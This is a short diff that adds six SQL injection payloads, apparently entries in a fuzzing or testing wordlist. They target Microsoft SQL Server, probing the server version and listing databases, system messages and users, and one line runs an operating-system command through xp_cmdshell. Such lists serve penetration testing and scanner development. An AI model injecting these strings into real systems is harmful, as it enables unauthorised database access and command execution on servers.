@@ -1,0 +1,6 @@
+' and 1 in (SELECT @@version) --
+'' exec master..xp_cmdshell 'vol'--
+'; select * from dbo.sysdatabases--
+'; select @@ version,1,1,1--
+'; select * from master..sysmessages--
+'; select * from sys.dba_users--
